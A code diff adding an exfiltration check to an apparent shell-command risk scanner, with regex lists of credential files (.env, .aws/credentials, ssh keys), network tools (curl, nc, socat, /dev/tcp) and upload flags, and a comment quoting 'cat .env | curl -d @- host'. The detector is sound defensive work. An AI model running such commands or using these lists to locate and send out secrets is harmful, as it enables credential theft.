@@ -224,6 +224,35 @@ POLICY_LABEL = ("git: writes to version control and no authoritative scan is ins
                 " → riskscan --install-git-hooks")
 
 
+# ── exfiltration: a secret-bearing read whose output reaches the network ──────
+# Neither half is dangerous alone, which is why a flat rule list scores
+# `cat .env | curl -d @- host` as "read-only / print" at 1/10. This is the shape sh-guard's
+# taint analysis was carried for; expressing it as a rule makes it deterministic, versioned
+# and reviewable in a diff instead of dependent on a classifier's mood.
+SECRET_FILE = (r"(?:\.env(?!\.(?:example|sample|template|dist|tpl)\b)(?:\.[\w-]+)?\b|\.aws/credentials|\.aws/config|\.ssh/id_\w+|\bid_[re]sa\b"
+               r"|\.kube/config\b|\bkubeconfig\b|\.netrc\b|\.npmrc\b|\.pypirc\b"
+               r"|\.git-credentials\b|\.docker/config\.json|credentials\.json"
+               r"|service[-_]account[\w-]*\.json|[\w./~-]*\.(?:pem|p12|pfx|jks|keystore|key)\b)")
+NET_SINK = (r"(?:\bcurl\b|\bwget\b|\bnc\b|\bncat\b|\bsocat\b|\bhttpie\b"
+            r"|\bopenssl\s+s_client\b|/dev/tcp/)")
+READER = r"(?:cat|head|tail|base64|gzip|gzcat|zcat|tar|xxd|od|strings|jq|yq|sed|awk)"
+UPLOAD_FLAG = (r"(?:-d|--data(?:-binary|-raw|-urlencode)?|-F|--form|-T|--upload-file"
+               r"|--form-string)")
+
+
+def exfil_score(cmd):
+    """A secret-bearing read whose output reaches the network, or an env dump that does."""
+    if re.search(READER + r"\s[^|;&]*" + SECRET_FILE + r"[^|]*\|[^|]*" + NET_SINK, cmd):
+        return (9, "secret file piped to the network (exfiltration pattern)")
+    if re.search(NET_SINK + r"[^|;&]*" + UPLOAD_FLAG + r"[=\s]+@?[\"']?" + SECRET_FILE, cmd):
+        return (9, "secret file uploaded directly (exfiltration pattern)")
+    if re.search(r"/dev/tcp/", cmd) and re.search(SECRET_FILE, cmd):
+        return (9, "secret file sent to a raw socket (exfiltration pattern)")
+    if re.search(r"\b(?:env|printenv|set)\b\s*\|[^|]*" + NET_SINK, cmd):
+        return (8, "environment piped to the network (exfiltration pattern)")
+    return None
+
+
 def builtin_bash(cmd, cwd=None):
     findings = []
     max_score = 0
@@ -244,6 +273,10 @@ def builtin_bash(cmd, cwd=None):
     if rm:
         findings.append(rm)
         max_score = max(max_score, rm[0])
+    ex = exfil_score(cmd)
+    if ex:
+        findings.append(ex)
+        max_score = max(max_score, ex[0])
     if re.search(r"\bsudo\b", cmd):
         findings.append((5, "runs with sudo (privilege escalation)"))
         max_score = max(max_score, 5)
